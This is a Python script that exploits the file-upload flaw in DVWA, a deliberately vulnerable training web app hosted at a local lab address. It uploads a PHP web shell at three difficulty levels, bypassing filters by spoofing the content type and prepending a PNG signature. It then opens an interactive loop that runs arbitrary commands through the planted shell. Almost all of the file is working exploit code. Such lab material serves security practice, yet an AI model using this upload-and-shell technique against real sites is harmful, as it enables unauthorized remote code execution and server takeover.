"""
    File upload in DVWA
"""

import requests
import os
import sys
sys.path.insert(0,'../') # To import dvwa module
import dvwa
from bs4 import BeautifulSoup
"""
pip install bs4
pip install lxml
"""

def check_file_upload(resp):
    if "succesfully uploaded!" in resp.text:
        return True
    else:
        print("[Warning] : The file hasn't been uploaded")
        return False

def exploit_low(sess, filename, php_code="<?php system($_REQUEST[\"cmd\"]) ?>"):
    file = bytearray()
    file.extend(php_code.encode())
    files = {'uploaded': (filename, file)}
    values = {'DB': 'photcat', 'OUT': 'csv', 'SHORT': 'short', 'Upload':'Upload'}

    resp = sess.post("http://192.168.1.73/dvwa/vulnerabilities/upload/", files=files, data=values)
    #print(resp.text)
    return check_file_upload(resp)

def exploit_med(sess, filename, php_code="<?php system($_REQUEST[\"cmd\"]) ?>"):
    file = bytearray()
    file.extend(php_code.encode())
    files = {'uploaded': (filename, file, "image/png")}
    values = {'DB': 'photcat', 'OUT': 'csv', 'SHORT': 'short', 'Upload':'Upload'}

    resp = sess.post("http://192.168.1.73/dvwa/vulnerabilities/upload/", files=files, data=values)
    #print(resp.text)
    return check_file_upload(resp)
"""
For the high exploit, when it comes to the null byte injection in the filename, it's not working since PHP 7.4 (https://stackoverflow.com/questions/14791790/null-byte-injection-in-an-upload-form)
But the PNG header spoofing will work
"""
def exploit_high(sess, filename, php_code="<?php system($_REQUEST[\"cmd\"]) ?>"):
    file = bytearray()
    file.extend([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]) # PNG signature
    file.extend(php_code.encode())
    files = {'uploaded': (filename, file, "image/png")}
    values = {'DB': 'photcat', 'OUT': 'csv', 'SHORT': 'short', 'Upload':'Upload'}

    resp = sess.post("http://192.168.1.73/dvwa/vulnerabilities/upload/", files=files, data=values)
    #print(resp.text)
    return check_file_upload(resp)

def access_shell(sess, filename, command="whoami"):
    resp = sess.get("http://192.168.1.73/dvwa/hackable/uploads/"+filename, params={"cmd":command})
    print(resp.text)

def main():
    sess = requests.Session()
    sess = dvwa.login_dvwa(sess, "http://192.168.1.73/dvwa/login.php")
    sess = dvwa.set_dvwa_difficulty(sess, "http://192.168.1.73/dvwa/security.php", "high")
    
    if exploit_high(sess, "exploit.php") == True:
        while(True):
            command_to_send = input("> ")
            access_shell(sess, "exploit.png", command_to_send)
    
main()